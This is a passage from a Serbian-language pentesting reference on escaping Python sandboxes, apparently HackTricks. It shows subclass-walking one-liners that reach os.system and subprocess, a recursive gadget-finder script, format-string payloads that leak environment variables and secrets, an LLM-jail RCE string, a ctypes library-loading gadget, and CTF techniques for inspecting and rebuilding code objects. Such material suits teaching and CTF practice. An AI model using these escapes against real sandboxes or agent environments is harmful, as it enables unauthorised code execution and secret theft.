Možemo uraditi isto i sa **drugim bibliotekama** za koje znamo da se mogu koristiti za **izvršavanje komandi**:

```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```

Pored toga, mogli bismo čak da pretražimo koji moduli učitavaju zlonamerne biblioteke:

```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
     vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
     print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```

Štaviše, ako mislite da bi **druge biblioteke** mogle da **pozivaju funkcije za izvršavanje komandi**, možemo da filtriramo i po nazivima funkcija u mogućim bibliotekama:

```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
     vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
     print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```

## Rekurzivna pretraga Builtins, Globals...

> [!WARNING]
> Ovo je prosto **sjajno**. Ako **tražite objekat kao što su globals, builtins, open ili bilo šta drugo**, samo upotrebite ovu skriptu da **rekurzivno pronađete mesta na kojima se taj objekat može naći.**

```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
    # Misc
    "__globals__": set(),
    "builtins": set(),
    "__builtins__": set(),
    "open": set(),

    # RCE libs
    "os": set(),
    "subprocess": set(),
    "commands": set(),
    "pty": set(),
    "importlib": set(),
    "imp": set(),
    "sys": set(),
    "pip": set(),
    "pdb": set(),

    # RCE methods
    "system": set(),
    "popen": set(),
    "getstatusoutput": set(),
    "getoutput": set(),
    "call": set(),
    "Popen": set(),
    "popen": set(),
    "spawn": set(),
    "import_module": set(),
    "__import__": set(),
    "load_source": set(),
    "execfile": set(),
    "execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
    # If bigger than maximum, stop
    if cont > MAX_CONT:
        return

    # If already checked, stop
    #if name and name in ALREADY_CHECKED:
    #    return

    # Add to already checked
    #if name:
    #    ALREADY_CHECKED.add(name)

    # If found add to the dict
    for k in SEARCH_FOR:
        if k in dir(element) or (type(element) is dict and k in element):
            SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

    # Continue with the recursivity
    for new_element in dir(element):
        try:
            check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

            # WARNING: Calling random functions sometimes kills the script
            # Comment this part if you notice that behaviour!!
            if execute:
                try:
                    if callable(getattr(element, new_element)):
                        check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
                except:
                    pass

        except:
            pass

    # If in a dict, scan also each key, very important
    if type(element) is dict:
        for new_element in element:
            check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
    print("Checking from empty string...")
    total = [""]
    for i,element in enumerate(total):
        print(f"\rStatus: {i}/{len(total)}", end="")
        cont = 1
        check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

    print()
    print("Checking loaded subclasses...")
    total = "".__class__.__base__.__subclasses__()
    for i,element in enumerate(total):
        print(f"\rStatus: {i}/{len(total)}", end="")
        cont = 1
        check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

    print()
    print("Checking from global functions...")
    total = [print, check_recursive]
    for i,element in enumerate(total):
        print(f"\rStatus: {i}/{len(total)}", end="")
        cont = 1
        check_recursive(element, cont, "", str(element), f"Global func {i}", False)

    print()
    print(SEARCH_FOR)


if __name__ == "__main__":
    main()
```

You can check the output of this script on this page:


{{#ref}}
https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
{{#endref}}

## Python Format String

Ako **pošaljete** **string** Python-u koji će biti **formatiran**, možete koristiti `{}` za pristup **internim informacijama Pythona.** Možete, na primer, koristiti prethodne primere za pristup globalnim promenljivama ili ugrađenim funkcijama.<sup>[[14]](#references)</sup>

```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
    "KEY": "ASXFYFGK78989"
}

class PeopleInfo:
    def __init__(self, fname, lname):
        self.fname = fname
        self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
    return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```

Imajte na umu da **atributima** možete da pristupite na uobičajen način, pomoću **tačke**, kao u `people_obj.__init__`, a **elementu dict-a** pomoću **uglaste zagrade**, bez navodnika: `__globals__[CONFIG]`

Takođe, imajte na umu da pomoću `.__dict__` možete da izlistate elemente objekta: `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

Još jedna zanimljiva karakteristika format stringova jeste mogućnost **izvršavanja** funkcija **`str`**, **`repr`** i **`ascii`** nad navedenim objektom dodavanjem **`!s`**, **`!r`** i **`!a`**, tim redom:

```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```

Štaviše, moguće je **napisati nove formatere** u klasama:

```python
class HAL9000(object):
    def __format__(self, format):
        if (format == 'open-the-pod-bay-doors'):
            return "I'm afraid I can't do that."
        return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```

**Više primera** za primere sa **format string** možete pronaći na [**https://pyformat.info/**](https://pyformat.info)

> [!CAUTION]
> Pogledajte i sledeću stranicu za gedžete koji mogu da pro**čitaju osetljive informacije iz internih Python objekata**:


{{#ref}}
../python-internal-read-gadgets.md
{{#endref}}

### Payloads za otkrivanje osetljivih informacija

```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}

# Example from https://corgi.rip/posts/buckeye-writeups/
secret_variable = "clueless"
x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
str(x) # Out: clueless
```

### LLM Jails bypass

Iz [ovog izvora](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`.<sup>[[12]](#references)</sup>

### Od format stringa do RCE-a učitavanjem biblioteka

Prema [**TypeMonkey chall iz ovog writeupa**](https://corgi.rip/posts/buckeye-writeups/), moguće je učitati proizvoljne biblioteke sa diska zloupotrebom ranjivosti format stringa u Pythonu.<sup>[[13]](#references)</sup>

Podsetimo, svaki put kada se u Pythonu izvrši neka radnja, poziva se neka funkcija. Na primer, `2*3` će izvršiti **`(2).mul(3)`**, a **`{'a':'b'}['a']`** će biti **`{'a':'b'}.__getitem__('a')`**.

Još sličnih primera možete pronaći u odeljku [**Python execution without calls**](#python-execution-without-calls).

Ranjivost format stringa u Pythonu ne omogućava izvršavanje funkcije (ne dozvoljava upotrebu zagrada), pa nije moguće postići RCE na primer pomoću `'{0.system("/bin/sh")}'.format(os)`.\
Međutim, moguće je koristiti `[]`. Zato, ako neka uobičajena Python biblioteka ima metodu **`__getitem__`** ili **`__getattr__`** koja izvršava proizvoljan kod, moguće ih je zloupotrebiti za postizanje RCE-a.

U potrazi za takvim gadgetom u Pythonu, autor writeupa predlaže ovaj [**GitHub upit za pretragu**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code). Pronašao je ovaj [primer](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):

```python
class LibraryLoader(object):
    def __init__(self, dlltype):
        self._dlltype = dlltype

    def __getattr__(self, name):
        if name[0] == '_':
            raise AttributeError(name)
        try:
            dll = self._dlltype(name)
        except OSError:
            raise AttributeError(name)
        setattr(self, name, dll)
        return dll

    def __getitem__(self, name):
        return getattr(self, name)

cdll = LibraryLoader(CDLL)
pydll = LibraryLoader(PyDLL)
```

Ovaj gadget omogućava **učitavanje biblioteke sa diska**. Zato je potrebno nekako **upisati ili otpremiti biblioteku koju treba učitati**, pravilno kompajliranu za napadnuti server.

```python
'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
```

Izazov zapravo zloupotrebljava drugu ranjivost na serveru koja omogućava kreiranje proizvoljnih datoteka na disku servera.

## Analiza Python objekata

> [!TIP]
> Ako želite detaljno da **naučite** o **Python bytecode-u**, pročitajte ovaj **sjajan** tekst o toj temi: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)

U nekim CTF-ovima može vam biti dato ime **prilagođene funkcije u kojoj se nalazi flag**, a potrebno je da pregledate **unutrašnjost** **funkcije** kako biste ga izdvojili.

Ovo je funkcija koju treba pregledati:

```python
def get_flag(some_input):
    var1=1
    var2="secretcode"
    var3=["some","array"]
    if some_input == var2:
        return "THIS-IS-THE-FALG!"
    else:
        return "Nope"
```

#### dir

```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```

#### globals

`__globals__` and `func_globals`(Isto) Dobija globalno okruženje. U primeru možete videti neke uvezene module, neke globalne promenljive i njihove definisane vrednosti:

```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```

[**Pogledajte ovde još mesta za pribavljanje globals**](#globals-and-locals)

### **Pristupanje kodu funkcije**

**`__code__`** i `func_code`: Možete **pristupiti** ovom **atributu** funkcije da biste **dobili objekat koda** funkcije.

```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```

### Dobijanje informacija o kodu

```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
    return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```

### **Disasembliranje funkcije**

```python
import dis
dis.dis(get_flag)
  2           0 LOAD_CONST               1 (1)
              3 STORE_FAST               1 (var1)

  3           6 LOAD_CONST               2 ('secretcode')
              9 STORE_FAST               2 (var2)

  4          12 LOAD_CONST               3 ('some')
             15 LOAD_CONST               4 ('array')
             18 BUILD_LIST               2
             21 STORE_FAST               3 (var3)

  5          24 LOAD_FAST                0 (some_input)
             27 LOAD_FAST                2 (var2)
             30 COMPARE_OP               2 (==)
             33 POP_JUMP_IF_FALSE       40

  6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
             39 RETURN_VALUE

  8     >>   40 LOAD_CONST               6 ('Nope')
             43 RETURN_VALUE
             44 LOAD_CONST               0 (None)
             47 RETURN_VALUE
```

Imajte na umu da **ako ne možete da uvezete `dis` u Python sandbox**, možete da pribavite **bytecode** funkcije (`get_flag.func_code.co_code`) i da ga lokalno disasemblirate. Nećete videti sadržaj promenljivih koje se učitavaju (`LOAD_CONST`), ali ih možete pogoditi na osnovu (`get_flag.func_code.co_consts`), jer `LOAD_CONST` takođe navodi pomeraj promenljive koja se učitava.

```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
          0 LOAD_CONST          1 (1)
          3 STORE_FAST          1 (1)
          6 LOAD_CONST          2 (2)
          9 STORE_FAST          2 (2)
         12 LOAD_CONST          3 (3)
         15 LOAD_CONST          4 (4)
         18 BUILD_LIST          2
         21 STORE_FAST          3 (3)
         24 LOAD_FAST           0 (0)
         27 LOAD_FAST           2 (2)
         30 COMPARE_OP          2 (==)
         33 POP_JUMP_IF_FALSE    40
         36 LOAD_CONST          5 (5)
         39 RETURN_VALUE
    >>   40 LOAD_CONST          6 (6)
         43 RETURN_VALUE
         44 LOAD_CONST          0 (0)
         47 RETURN_VALUE
```

## Kompajliranje Pythona

Zamislimo sada da nekako možete **izvući informacije o funkciji koju ne možete da izvršite**, ali **morate** da je **izvršite**.\
Kao u sledećem primeru, **možete da pristupite objektu koda** te funkcije, ali samo na osnovu disasembliranog koda **ne znate kako da izračunate flag** (_zamislite složeniju funkciju `calc_flag`_).<sup>[[3]](#references)</sup>

```python
def get_flag(some_input):
    var1=1
    var2="secretcode"
    var3=["some","array"]
    def calc_flag(flag_rot2):
        return ''.join(chr(ord(c)-2) for c in flag_rot2)
    if some_input == var2:
        return calc_flag("VjkuKuVjgHnci")
    else:
        return "Nope"
```

### Kreiranje code objekta

Pre svega, treba da znamo **kako da kreiramo i izvršimo code objekat** da bismo mogli da kreiramo jedan koji će izvršiti našu leakovanu funkciju:

```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
               co_nlocals, co_stacksize, co_flags,
               co_code, co_consts, co_names,
               co_varnames, co_filename, co_name,
               co_firstlineno, co_lnotab, freevars=None,
               cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
